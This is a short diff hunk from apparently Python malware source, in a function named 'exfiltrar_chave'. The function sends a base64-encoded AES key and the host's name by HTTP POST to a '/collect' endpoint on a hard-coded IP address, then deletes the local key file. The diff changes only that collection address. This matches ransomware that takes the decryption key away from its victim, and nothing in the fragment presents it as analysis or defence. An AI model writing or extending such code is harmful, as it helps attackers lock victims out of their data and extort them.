@@ -216,7 +216,7 @@ def exfiltrar_chave() -> Dict[str, Any]:
             "aes_key": base64.b64encode(aes_bytes).decode("utf-8"),
             "hostname": hostname,
         }
-        url = "http://10.150.3.162:8080/collect"
+        url = "http://10.254.19.191:8080/collect"
         resp = requests.post(url, json=payload, timeout=10)
         resp.raise_for_status()
         os.remove(path)
